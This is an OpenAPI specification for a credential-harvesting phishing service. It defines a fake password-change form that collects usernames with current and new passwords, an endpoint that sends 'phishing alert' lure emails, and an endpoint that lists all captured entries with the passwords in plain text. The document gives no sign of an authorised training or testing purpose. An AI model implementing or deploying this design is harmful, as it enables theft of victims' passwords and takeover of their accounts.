openapi: 3.1.0
info:
  title: Api
  version: 0.1.0
  description: API specification
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: phish
    description: Phishing form operations
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      description: Returns server health status
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"
  /phish/submit:
    post:
      operationId: submitCredentials
      tags: [phish]
      summary: Submit password change form
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SubmitCredentialsBody"
      responses:
        "200":
          description: Submission recorded
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SubmitCredentialsResponse"
  /phish/send-alert:
    post:
      operationId: sendAlert
      tags: [phish]
      summary: Send phishing alert email
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SendAlertBody"
      responses:
        "200":
          description: Email sent
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SendAlertResponse"
  /phish/entries:
    get:
      operationId: getEntries
      tags: [phish]
      summary: Get all collected entries
      responses:
        "200":
          description: List of captured entries
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/EntriesResponse"
components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status
    SubmitCredentialsBody:
      type: object
      properties:
        username:
          type: string
        currentPassword:
          type: string
        confirmCurrentPassword:
          type: string
        newPassword:
          type: string
        confirmNewPassword:
          type: string
      required:
        - username
        - currentPassword
        - confirmCurrentPassword
        - newPassword
        - confirmNewPassword
    SubmitCredentialsResponse:
      type: object
      properties:
        success:
          type: boolean
        message:
          type: string
      required:
        - success
        - message
    CapturedEntry:
      type: object
      properties:
        id:
          type: integer
        username:
          type: string
        currentPassword:
          type: string
        confirmCurrentPassword:
          type: string
        newPassword:
          type: string
        confirmNewPassword:
          type: string
        submittedAt:
          type: string
      required:
        - id
        - username
        - currentPassword
        - confirmCurrentPassword
        - newPassword
        - confirmNewPassword
        - submittedAt
    SendAlertBody:
      type: object
      properties:
        email:
          type: string
      required:
        - email
    SendAlertResponse:
      type: object
      properties:
        success:
          type: boolean
        message:
          type: string
      required:
        - success
        - message
    EntriesResponse:
      type: object
      properties:
        entries:
          type: array
          items:
            $ref: "#/components/schemas/CapturedEntry"
      required:
        - entries
